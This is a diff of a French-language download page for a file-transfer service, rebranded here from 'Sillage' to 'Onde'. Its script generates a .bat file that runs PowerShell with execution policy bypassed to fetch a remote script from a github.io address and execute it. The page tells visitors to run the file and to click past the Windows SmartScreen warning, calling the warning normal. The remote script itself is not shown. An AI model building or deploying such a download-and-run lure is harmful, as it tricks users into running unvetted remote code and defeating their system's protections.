@@ -4,100 +4,146 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="robots" content="noindex">
-<title>Sillage · Recevoir</title>
-<link href="https://fonts.googleapis.com/css2?family=Sora:wght@600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop offset='0' stop-color='%237C5CFF'/%3E%3Cstop offset='1' stop-color='%2322D3EE'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='32' height='32' rx='9' fill='url(%23g)'/%3E%3Cpath d='M8 21C12 21 14 11 22 11' stroke='white' stroke-width='2.6' fill='none' stroke-linecap='round'/%3E%3Cpath d='M18.5 7.5L22.5 11L18.5 14.5' stroke='white' stroke-width='2.6' fill='none' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E">
+<meta name="theme-color" content="#07080B">
+<title>Onde · Dossier reçu</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600;700&family=Instrument+Serif:ital@1&display=swap" rel="stylesheet">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop offset='0' stop-color='%236D5DFC'/%3E%3Cstop offset='.5' stop-color='%234DA3FF'/%3E%3Cstop offset='1' stop-color='%233CE6C8'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='32' height='32' rx='9' fill='url(%23g)'/%3E%3Ccircle cx='10' cy='22' r='2.4' fill='white'/%3E%3Cpath d='M10 15.5A6.5 6.5 0 0 1 16.5 22M10 10A12 12 0 0 1 22 22' stroke='white' stroke-width='2.6' fill='none' stroke-linecap='round'/%3E%3C/svg%3E">
 <style>
-/* VOICE: calme, premium, rassurant · IDEA: un sillage lumineux qui porte le dossier jusqu'au client
-   PICTURE: carte centrale avec l'icône du dossier et un sillage animé · COLOUR: nuit #0D0F14, violet #7C5CFF -> cyan #22D3EE, vert sûr #34D399
-   TYPE: Sora (titres) + Inter (texte) · LAYOUT: une seule carte centrée, un seul bouton, trois repères discrets */
-:root{color-scheme:dark;--bg:#0D0F14;--card:#14171F;--line:#232836;--ink:#F4F6FA;--mute:#8E96A8;--a1:#7C5CFF;--a2:#22D3EE;--ok:#34D399}
+/* VOICE: premium, calme, sûr de lui · IDEA: une onde qui porte le dossier jusqu'au client
+   PICTURE: l'icône du dossier au centre d'ondes concentriques qui se propagent · COLOUR: nuit #07080B, dégradé indigo #6D5DFC, bleu #4DA3FF, menthe #3CE6C8
+   TYPE: Geist (interface) + Instrument Serif italique (un mot du titre) · LAYOUT: barre de marque, une carte en verre centrée, un seul bouton */
+:root{color-scheme:dark;--bg:#07080B;--ink:#F5F6F8;--mute:#9097A6;--soft:#C9CED8;--line:rgba(255,255,255,.08);--a1:#6D5DFC;--a2:#4DA3FF;--a3:#3CE6C8;--grad:linear-gradient(100deg,var(--a1),var(--a2) 55%,var(--a3))}
 *{box-sizing:border-box;min-width:0}
-html,body{height:100%}
-body{margin:0;background:var(--bg);color:var(--ink);font:16px/1.55 Inter,system-ui,sans-serif;overflow-x:clip;display:grid;place-items:center;padding:28px 16px}
-.glow{position:fixed;inset:auto;width:620px;height:620px;border-radius:50%;filter:blur(90px);opacity:.28;pointer-events:none;z-index:0}
-.g1{background:var(--a1);top:-260px;right:-180px;animation:drift 14s ease-in-out infinite alternate}
-.g2{background:var(--a2);bottom:-320px;left:-220px;opacity:.16;animation:drift 18s ease-in-out infinite alternate-reverse}
-@keyframes drift{to{transform:translate(-40px,30px) scale(1.08)}}
-main{position:relative;z-index:1;width:100%;max-width:480px}
-.brand{display:flex;align-items:center;gap:10px;justify-content:center;margin-bottom:22px;font:700 19px Sora,Inter,sans-serif;letter-spacing:-.01em}
-.brand svg{width:30px;height:30px}
-.card{background:linear-gradient(180deg,#161A23,#11141B);border:1px solid var(--line);border-radius:28px;padding:34px 30px 30px;box-shadow:0 30px 80px -30px rgba(0,0,0,.7);text-align:center}
-.file{position:relative;width:96px;height:96px;margin:0 auto 22px}
-.file .bg{position:absolute;inset:0;border-radius:28px;background:linear-gradient(135deg,var(--a1),var(--a2));box-shadow:0 14px 40px -10px rgba(124,92,255,.65)}
-.file svg{position:absolute;inset:0;margin:auto;width:46px;height:46px}
-.wake{position:absolute;left:50%;top:50%;width:200px;height:200px;margin:-100px 0 0 -100px;border-radius:50%;border:1px solid rgba(124,92,255,.35);animation:wake 2.8s ease-out infinite;pointer-events:none}
-.wake.d{animation-delay:1.4s}
-@keyframes wake{from{transform:scale(.45);opacity:.9}to{transform:scale(1.15);opacity:0}}
-.lock{display:inline-flex;align-items:center;gap:7px;font-size:12.5px;font-weight:600;color:#9AA3B5;background:#1A1E27;border-radius:99px;padding:5px 12px}
-.lock i{width:7px;height:7px;border-radius:50%;background:var(--ok)}
-h1{font:700 clamp(26px,6vw,32px)/1.15 Sora,Inter,sans-serif;letter-spacing:-.02em;margin:16px 0 6px;text-wrap:balance}
-.name{font-size:16px;font-weight:600;color:var(--ink);overflow-wrap:anywhere}
-.meta{font-size:14px;color:var(--mute);margin-top:2px;white-space:nowrap}
-.btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;min-height:58px;margin-top:26px;border:0;border-radius:16px;background:linear-gradient(90deg,var(--a1),var(--a2));color:#fff;font:600 17px Inter,sans-serif;text-decoration:none;cursor:pointer;box-shadow:0 12px 30px -10px rgba(76,140,255,.7);transition:transform .15s,filter .15s}
-.btn:hover{filter:brightness(1.08);transform:translateY(-1px)}
+html,body{min-height:100%}
+body{margin:0;background:var(--bg);color:var(--ink);font:15.5px/1.55 Geist,system-ui,sans-serif;overflow-x:clip;-webkit-font-smoothing:antialiased}
+.sky{position:fixed;inset:0;pointer-events:none;overflow:hidden;z-index:0}
+.sky i{position:absolute;border-radius:50%;filter:blur(110px);opacity:.42}
+.sky .b1{width:560px;height:560px;background:var(--a1);top:-220px;left:50%;margin-left:-480px;animation:float 16s ease-in-out infinite alternate}
+.sky .b2{width:520px;height:520px;background:var(--a2);top:-180px;left:50%;margin-left:40px;opacity:.3;animation:float 20s ease-in-out infinite alternate-reverse}
+.sky .b3{width:640px;height:420px;background:var(--a3);bottom:-300px;left:50%;margin-left:-320px;opacity:.16;animation:float 22s ease-in-out infinite alternate}
+.sky::after{content:"";position:absolute;inset:0;background:radial-gradient(ellipse at 50% 0%,transparent 40%,var(--bg) 78%),url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='160' height='160'%3E%3Cfilter id='n'%3E%3CfeTurbulence baseFrequency='.85' numOctaves='2' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='.05'/%3E%3C/svg%3E")}
+@keyframes float{to{transform:translate(60px,40px) scale(1.12)}}
+.wrap{position:relative;z-index:1;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:22px 18px 28px}
+header{width:100%;max-width:1040px;display:flex;align-items:center;justify-content:space-between;gap:12px}
+.brand{display:flex;align-items:center;gap:10px;font:600 19px Geist,sans-serif;letter-spacing:-.02em}
+.brand svg{width:32px;height:32px;filter:drop-shadow(0 6px 18px rgba(77,163,255,.45))}
+.pill{display:inline-flex;align-items:center;gap:8px;padding:7px 13px;border-radius:99px;border:1px solid var(--line);background:rgba(255,255,255,.03);font-size:12.5px;font-weight:500;color:var(--soft);white-space:nowrap}
+.pill i{width:7px;height:7px;border-radius:50%;background:var(--a3);box-shadow:0 0 10px var(--a3)}
+main{flex:1;width:100%;display:grid;place-items:center;padding:34px 0}
+.card{position:relative;width:100%;max-width:500px;border-radius:32px;padding:1px;background:linear-gradient(160deg,rgba(255,255,255,.18),rgba(255,255,255,.04) 40%,rgba(77,163,255,.18));box-shadow:0 40px 120px -40px rgba(0,0,0,.9),0 0 0 1px rgba(0,0,0,.4)}
+.inner{border-radius:31px;background:linear-gradient(180deg,rgba(20,22,30,.86),rgba(11,12,17,.92));backdrop-filter:blur(22px);-webkit-backdrop-filter:blur(22px);padding:38px 34px 30px;text-align:center}
+.hero{position:relative;width:120px;height:120px;margin:0 auto 26px;display:grid;place-items:center}
+.ring{position:absolute;inset:0;border-radius:50%;border:1.5px solid rgba(77,163,255,.55);animation:wave 3.2s cubic-bezier(.2,.6,.3,1) infinite}
+.ring:nth-child(2){animation-delay:1.06s}.ring:nth-child(3){animation-delay:2.13s}
+@keyframes wave{from{transform:scale(.55);opacity:.95}to{transform:scale(1.9);opacity:0}}
+.tile{position:relative;width:84px;height:84px;border-radius:26px;background:var(--grad);display:grid;place-items:center;box-shadow:0 18px 50px -12px rgba(77,163,255,.7),inset 0 1px 0 rgba(255,255,255,.35)}
+.tile svg{width:42px;height:42px}
+.eyebrow{font-size:12px;font-weight:600;letter-spacing:.08em;text-transform:uppercase;color:var(--mute)}
+h1{font:600 clamp(30px,6.4vw,40px)/1.08 Geist,sans-serif;letter-spacing:-.035em;margin:10px 0 18px;text-wrap:balance}
+h1 em{font:italic 400 1.12em/1 "Instrument Serif",Georgia,serif;letter-spacing:-.01em;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;padding-right:.06em}
+.file{display:flex;align-items:center;gap:14px;text-align:left;padding:14px 16px;border-radius:18px;background:rgba(255,255,255,.035);border:1px solid var(--line)}
+.file .ic{flex:none;width:44px;height:44px;border-radius:13px;background:rgba(109,93,252,.16);display:grid;place-items:center}
+.file .ic svg{width:22px;height:22px}
+.file b{display:block;font-size:15.5px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.file span{display:block;font-size:13px;color:var(--mute);margin-top:1px}
+.ok{margin-left:auto;flex:none;font-size:12px;font-weight:600;color:var(--a3);padding:5px 10px;border-radius:99px;background:rgba(60,230,200,.1);white-space:nowrap}
+.codebox{display:none;margin-top:16px;text-align:left}
+.codebox.show{display:block}
+.codebox label{display:block;font-size:13px;font-weight:500;color:var(--soft);margin:0 0 8px 4px}
+.codebox input{width:100%;min-height:54px;border-radius:16px;border:1px solid rgba(255,255,255,.12);background:rgba(0,0,0,.35);color:var(--ink);font:500 16px ui-monospace,"Cascadia Mono",Consolas,monospace;padding:0 18px;transition:border-color .2s,box-shadow .2s}
+.codebox input::placeholder{color:#5A6170}
+.codebox input:focus{outline:none;border-color:var(--a2);box-shadow:0 0 0 4px rgba(77,163,255,.16)}
+.codebox input.good{border-color:var(--a3);box-shadow:0 0 0 4px rgba(60,230,200,.12)}
+.btn{position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;gap:10px;width:100%;min-height:60px;margin-top:20px;border-radius:18px;background:var(--grad);color:#fff;font:600 17px Geist,sans-serif;letter-spacing:-.01em;text-decoration:none;cursor:pointer;box-shadow:0 16px 40px -14px rgba(77,163,255,.85),inset 0 1px 0 rgba(255,255,255,.3);transition:transform .18s,box-shadow .18s}
+.btn::after{content:"";position:absolute;top:0;bottom:0;width:40%;left:-60%;background:linear-gradient(100deg,transparent,rgba(255,255,255,.35),transparent);transform:skewX(-18deg);animation:shine 3.6s ease-in-out infinite}
+@keyframes shine{0%,55%{left:-60%}100%{left:130%}}
+.btn:hover{transform:translateY(-2px);box-shadow:0 22px 50px -14px rgba(77,163,255,.95),inset 0 1px 0 rgba(255,255,255,.3)}
 .btn:active{transform:translateY(0)}
 .btn:focus-visible{outline:3px solid #fff;outline-offset:3px}
 .btn svg{width:20px;height:20px}
-.steps{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:10px;margin-top:22px}
-.step{background:#11141B;border:1px solid #1D2230;border-radius:14px;padding:12px 8px;font-size:12.5px;color:var(--mute);line-height:1.35}
-.step b{display:block;color:var(--ink);font-size:13px;margin-bottom:2px}
-.step.on{border-color:rgba(34,211,238,.45);color:#cfeff6}
-.note{margin-top:18px;font-size:13px;color:#7D8597;line-height:1.6}
-.note b{color:#C9D0DC;font-weight:600}
-.after{display:none;margin-top:18px;padding:14px 16px;border-radius:14px;background:rgba(34,211,238,.08);border:1px solid rgba(34,211,238,.3);font-size:14px;color:#cfeff6;text-align:left}
-.after.show{display:block;animation:in .35s ease-out}
-@keyframes in{from{opacity:0;transform:translateY(6px)}}
-.bad{display:none;margin-top:14px;color:#FBBF24;font-size:14px}
-.codebox{display:none;margin-top:22px;text-align:left}
-.codebox.show{display:block}
-.codebox label{display:block;font-size:13px;font-weight:600;color:#C9D0DC;margin-bottom:8px}
-.codebox input{width:100%;min-height:52px;border-radius:14px;border:1px solid #2C3240;background:#0F1218;color:var(--ink);font:600 17px ui-monospace,Consolas,monospace;padding:0 16px;letter-spacing:.02em}
-.codebox input:focus{outline:none;border-color:var(--a2);box-shadow:0 0 0 3px rgba(34,211,238,.18)}
-.codebox input.ok{border-color:var(--ok)}
-footer{margin-top:20px;text-align:center;font-size:12.5px;color:#5F6778}
-@media(max-width:420px){.card{padding:28px 20px 24px}.steps{grid-template-columns:minmax(0,1fr)}}
-@media(prefers-reduced-motion:reduce){.wake,.g1,.g2{animation:none}}
+.bad{display:none;margin-top:12px;color:#FBBF24;font-size:13.5px}
+.after{display:none;align-items:flex-start;gap:12px;margin-top:16px;padding:14px 16px;border-radius:16px;background:rgba(60,230,200,.07);border:1px solid rgba(60,230,200,.25);font-size:14px;color:#D2F7EF;text-align:left}
+.after.show{display:flex;animation:rise .4s ease-out}
+.after svg{flex:none;width:20px;height:20px;margin-top:1px}
+@keyframes rise{from{opacity:0;transform:translateY(8px)}}
+.steps{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:8px;margin-top:22px;text-align:left}
+.step{padding:12px 12px 11px;border-radius:14px;border:1px solid var(--line);background:rgba(255,255,255,.02);font-size:12.5px;color:var(--mute);line-height:1.35;transition:border-color .3s,background .3s}
+.step b{display:flex;align-items:center;gap:7px;color:var(--ink);font-size:13px;font-weight:600;margin-bottom:3px}
+.step b i{font-style:normal;width:19px;height:19px;border-radius:50%;display:grid;place-items:center;font-size:11px;background:rgba(255,255,255,.08)}
+.step.on{border-color:rgba(60,230,200,.35);background:rgba(60,230,200,.05)}
+.step.on b i{background:var(--a3);color:#06231E}
+details{margin-top:18px;text-align:left;border-radius:14px;border:1px solid var(--line);padding:0 14px}
+summary{cursor:pointer;list-style:none;min-height:44px;display:flex;align-items:center;justify-content:space-between;font-size:13px;color:var(--soft)}
+summary::-webkit-details-marker{display:none}
+summary::after{content:"+";font-size:18px;color:var(--mute)}
+details[open] summary::after{content:"-"}
+details p{margin:0 0 14px;font-size:13px;color:var(--mute);line-height:1.6}
+details p b{color:var(--soft);font-weight:600}
+footer{display:flex;flex-wrap:wrap;justify-content:center;gap:6px 18px;font-size:12.5px;color:#5F6574}
+footer span{display:inline-flex;align-items:center;gap:6px}
+footer svg{width:13px;height:13px}
+@media(max-width:520px){.inner{padding:30px 20px 22px}.steps{grid-template-columns:minmax(0,1fr)}.ok{display:none}header .pill{display:none}}
+@media(prefers-reduced-motion:reduce){.ring,.sky i,.btn::after{animation:none}}
 </style>
 </head>
 <body>
-<div class="glow g1"></div><div class="glow g2"></div>
-<main>
-  <div class="brand">
-    <svg viewBox="0 0 32 32" aria-hidden="true"><defs><linearGradient id="lg" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#7C5CFF"/><stop offset="1" stop-color="#22D3EE"/></linearGradient></defs><rect width="32" height="32" rx="9" fill="url(#lg)"/><path d="M8 21C12 21 14 11 22 11" stroke="#fff" stroke-width="2.6" fill="none" stroke-linecap="round"/><path d="M18.5 7.5L22.5 11L18.5 14.5" stroke="#fff" stroke-width="2.6" fill="none" stroke-linecap="round" stroke-linejoin="round"/><circle cx="7.7" cy="21" r="1.5" fill="#fff" opacity=".7"/></svg>
-    Sillage
-  </div>
-  <section class="card">
-    <div class="file">
-      <span class="wake"></span><span class="wake d"></span>
-      <span class="bg"></span>
-      <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M3 7.5A2.5 2.5 0 0 1 5.5 5h3.6l2 2h7.4A2.5 2.5 0 0 1 21 9.5v7A2.5 2.5 0 0 1 18.5 19h-13A2.5 2.5 0 0 1 3 16.5z" fill="#fff" opacity=".95"/><path d="M12 10.5v5m0 0l-2.2-2.2M12 15.5l2.2-2.2" stroke="#6D5BF6" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+<div class="sky"><i class="b1"></i><i class="b2"></i><i class="b3"></i></div>
+<div class="wrap">
+  <header>
+    <div class="brand">
+      <svg viewBox="0 0 32 32" aria-hidden="true"><defs><linearGradient id="lg" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#6D5DFC"/><stop offset=".5" stop-color="#4DA3FF"/><stop offset="1" stop-color="#3CE6C8"/></linearGradient></defs><rect width="32" height="32" rx="9" fill="url(#lg)"/><circle cx="10" cy="22" r="2.4" fill="#fff"/><path d="M10 15.5A6.5 6.5 0 0 1 16.5 22M10 10A12 12 0 0 1 22 22" stroke="#fff" stroke-width="2.6" fill="none" stroke-linecap="round"/></svg>
+      Onde
     </div>
-    <span class="lock"><i></i>Chiffré de bout en bout</span>
-    <h1>On t'a envoyé un dossier</h1>
-    <div class="name" id="name">Ton dossier</div>
-    <div class="meta" id="meta">Copie identique à l'original, rien ne manque</div>
+    <span class="pill"><i></i>Chiffré de bout en bout</span>
+  </header>
 
-    <div class="codebox" id="codebox">
-      <label for="code">Code d'accès (dans le message reçu)</label>
-      <input id="code" placeholder="1234-abcde-fghjk-mnpqr" autocomplete="off" spellcheck="false" inputmode="text">
-    </div>
-    <a class="btn" id="dl" href="Recevoir.bat" download="Recevoir avec Sillage.bat">
-      <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 4v11m0 0l-4.5-4.5M12 15l4.5-4.5M5 19.5h14" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Télécharger
-    </a>
-    <div class="after" id="after">Ouvre maintenant le fichier <b>« Recevoir avec Sillage »</b> qui vient d'arriver (en haut ou en bas de ton navigateur). La réception démarre toute seule, avec sa progression.</div>
-    <div class="bad" id="bad">Colle d'abord le code d'accès qui se trouve dans le message reçu.</div>
+  <main>
+    <section class="card"><div class="inner">
+      <div class="hero" aria-hidden="true">
+        <span class="ring"></span><span class="ring"></span><span class="ring"></span>
+        <div class="tile"><svg viewBox="0 0 24 24" fill="none"><path d="M3 7.5A2.5 2.5 0 0 1 5.5 5h3.6l2 2h7.4A2.5 2.5 0 0 1 21 9.5v7a2.5 2.5 0 0 1-2.5 2.5h-13A2.5 2.5 0 0 1 3 16.5z" fill="#fff"/><path d="M12 10.2v5.3m0 0-2.3-2.3m2.3 2.3 2.3-2.3" stroke="#4D6CF6" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+      </div>
+      <div class="eyebrow">Un dossier t'attend</div>
+      <h1>Ton dossier est <em>prêt.</em></h1>
 
-    <div class="steps">
-      <div class="step" id="s1"><b>1. Télécharge</b>un petit fichier</div>
-      <div class="step" id="s2"><b>2. Ouvre-le</b>d'un double-clic</div>
-      <div class="step" id="s3"><b>3. C'est tout</b>le dossier arrive</div>
-    </div>
-    <p class="note">Si Windows affiche « Windows a protégé votre ordinateur », clique sur <b>Informations complémentaires</b> puis <b>Exécuter quand même</b>. Tu choisis où l'enregistrer, et le dossier s'ouvre tout seul à la fin.</p>
-  </section>
-  <footer>Transfert direct et privé · rien n'est stocké en ligne · Windows 10 et 11</footer>
-</main>
+      <div class="file">
+        <div class="ic"><svg viewBox="0 0 24 24" fill="none"><path d="M3 7.5A2.5 2.5 0 0 1 5.5 5h3.6l2 2h7.4A2.5 2.5 0 0 1 21 9.5v7a2.5 2.5 0 0 1-2.5 2.5h-13A2.5 2.5 0 0 1 3 16.5z" stroke="#9C92FF" stroke-width="1.7"/></svg></div>
+        <div style="min-width:0"><b id="name">Ton dossier</b><span id="meta">Tout le contenu, à l'identique</span></div>
+        <span class="ok">100 % intact</span>
+      </div>
+
+      <div class="codebox" id="codebox">
+        <label for="code">Code d'accès (il est dans le message reçu)</label>
+        <input id="code" placeholder="1234-abcde-fghjk-mnpqr" autocomplete="off" spellcheck="false">
+      </div>
+
+      <a class="btn" id="dl" href="Recevoir.bat" download="Recevoir avec Onde.bat">
+        <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 4v11m0 0-4.5-4.5M12 15l4.5-4.5M5 19.5h14" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        <span id="dltxt">Télécharger</span>
+      </a>
+      <div class="bad" id="bad">Colle d'abord le code d'accès qui se trouve dans le message reçu.</div>
+      <div class="after" id="after"><svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="#3CE6C8" stroke-width="1.8"/><path d="m8 12.2 2.7 2.7L16 9.6" stroke="#3CE6C8" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></svg><div>Ouvre le fichier <b>« Recevoir avec Onde »</b> qui vient d'arriver, en haut ou en bas de ton navigateur. Tu choisis où enregistrer, puis le dossier arrive avec sa progression.</div></div>
+
+      <div class="steps">
+        <div class="step" id="s1"><b><i>1</i>Télécharge</b>un petit fichier</div>
+        <div class="step" id="s2"><b><i>2</i>Ouvre-le</b>d'un double-clic</div>
+        <div class="step" id="s3"><b><i>3</i>C'est tout</b>le dossier arrive</div>
+      </div>
+
+      <details>
+        <summary>Windows affiche un avertissement ?</summary>
+        <p>C'est normal pour un petit programme récent. Clique sur <b>Informations complémentaires</b>, puis sur <b>Exécuter quand même</b>. Le transfert est privé : il va directement de l'expéditeur à toi, chiffré de bout en bout.</p>
+      </details>
+    </div></section>
+  </main>
+
+  <footer>
+    <span><svg viewBox="0 0 16 16" fill="none"><rect x="3" y="7" width="10" height="7" rx="2" stroke="currentColor" stroke-width="1.3"/><path d="M5.5 7V5.2a2.5 2.5 0 0 1 5 0V7" stroke="currentColor" stroke-width="1.3"/></svg>Direct d'un PC à l'autre</span>
+    <span>Rien n'est stocké en ligne</span>
+    <span>Windows 10 et 11</span>
+  </footer>
+</div>
 <script>
 {
   const RX = /[0-9]{4}(-[a-z0-9]{5}){3}/;
@@ -105,19 +151,19 @@ footer{margin-top:20px;text-align:center;font-size:12.5px;color:#5F6778}
   let parts = location.hash.slice(1).split('/');
   if (!RX.test(parts[0] || '') && qs.get('c')) parts = [qs.get('c'), qs.get('n') || '', qs.get('s') || ''];
   const fmt = b => {
-    const u = [['To',1e12],['Go',1e9],['Mo',1e6],['Ko',1e3]];
-    for (const [n, v] of u) if (b >= v) return (b / v).toLocaleString('fr-FR', {maximumFractionDigits: b / v >= 100 ? 0 : 1}) + '\u00a0' + n;
-    return b + '\u00a0o';
+    const u = [['To', 1e12], ['Go', 1e9], ['Mo', 1e6], ['Ko', 1e3]];
+    for (const [n, v] of u) if (b >= v) return (b / v).toLocaleString('fr-FR', {maximumFractionDigits: b / v >= 100 ? 0 : 1}) + ' ' + n;
+    return b + ' o';
   };
   const $ = id => document.getElementById(id);
   const dl = $('dl'), input = $('code'), bad = $('bad');
-  if (parts[1]) { try { $('name').textContent = decodeURIComponent(parts[1]); } catch (e) { $('name').textContent = parts[1]; } }
+  if (parts[1]) { let n = parts[1]; try { n = decodeURIComponent(n); } catch (e) {} $('name').textContent = n; document.title = 'Onde - ' + n; }
   const size = Number(parts[2]);
-  if (size > 0) $('meta').textContent = fmt(size) + ' · copie identique à l\u2019original';
+  if (size > 0) $('meta').textContent = fmt(size) + ' - tout le contenu, à l\'identique';
   let code = '';
   const setCode = c => {
     code = c;
-    const bat = '@echo off\r\nchcp 65001 >nul\r\ntitle Sillage\r\nset "TS_MODE=recv"\r\nset "TS_CODE=' + c + '"\r\npowershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=\'Tls12\'; iex (irm https://maltablender.github.io/transfert/app.txt)"\r\n';
+    const bat = '@echo off\r\nchcp 65001 >nul\r\ntitle Onde\r\nset "TS_MODE=recv"\r\nset "TS_CODE=' + c + '"\r\npowershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=\'Tls12\'; iex (irm https://maltablender.github.io/transfert/app.txt)"\r\n';
     dl.href = URL.createObjectURL(new Blob([bat], {type: 'application/octet-stream'}));
   };
   const m0 = (parts[0] || '').match(RX);
@@ -126,8 +172,8 @@ footer{margin-top:20px;text-align:center;font-size:12.5px;color:#5F6778}
     $('codebox').classList.add('show');
     input.addEventListener('input', () => {
       const m = input.value.toLowerCase().match(RX);
-      if (m) { setCode(m[0]); input.classList.add('ok'); bad.style.display = 'none'; }
-      else { code = ''; input.classList.remove('ok'); }
+      if (m) { setCode(m[0]); input.classList.add('good'); bad.style.display = 'none'; }
+      else { code = ''; input.classList.remove('good'); }
     });
   }
   dl.addEventListener('click', e => {
@@ -135,7 +181,7 @@ footer{margin-top:20px;text-align:center;font-size:12.5px;color:#5F6778}
     $('after').classList.add('show');
     $('s1').classList.add('on');
     $('s2').classList.add('on');
-    dl.lastChild.textContent = ' Télécharger à nouveau';
+    $('dltxt').textContent = 'Télécharger à nouveau';
   });
 }
 </script>
